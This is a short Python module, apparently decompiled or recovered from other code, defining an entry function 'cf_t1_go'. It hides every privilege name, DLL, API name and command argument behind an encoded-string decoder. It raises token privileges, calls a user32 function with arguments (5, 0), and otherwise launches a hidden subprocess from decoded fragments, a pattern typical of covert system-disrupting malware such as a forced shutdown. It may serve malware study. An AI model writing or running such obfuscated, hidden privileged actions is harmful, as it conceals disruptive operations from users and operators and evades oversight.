"""Recovered zero-argument entry ``cf_t1_go``.

Decompiled structure: token-privilege setup followed by a hidden
``subprocess.Popen`` whose argv is two decoded fragments plus a dynamic
line segment.
"""
from __future__ import annotations

import ctypes

from ..link._fds_jm import sec
from . import _ops


def cf_t1_go() -> None:
    _sy = sec("zp_uq_6n")
    _z = sec("hm_xd_3k")
    _primed = False
    _priv = sec("fg_vn_9c")
    _dll_a = sec("gh_wo_4r")
    _dll_k = sec("hi_xp_7m")
    _dll_u = sec("ij_yq_0b")
    _api = sec("jk_zr_3t")

    _primed = _ops.enable_privileges(_dll_a, _dll_k, (_priv,))
    if _primed:
        try:
            _u32 = ctypes.WinDLL(_dll_u, use_last_error=True)
            _fn = getattr(_u32, _api, None)
            _primed = bool(_fn(5, 0)) if callable(_fn) else False
        except Exception:
            _primed = False

    if not _primed:
        _sp = sec("lm_bt_1d")
        _line = sec("mn_cu_8f")
        _args = _sy + _z
        _ops.hidden_popen((_sp, _line, _args))

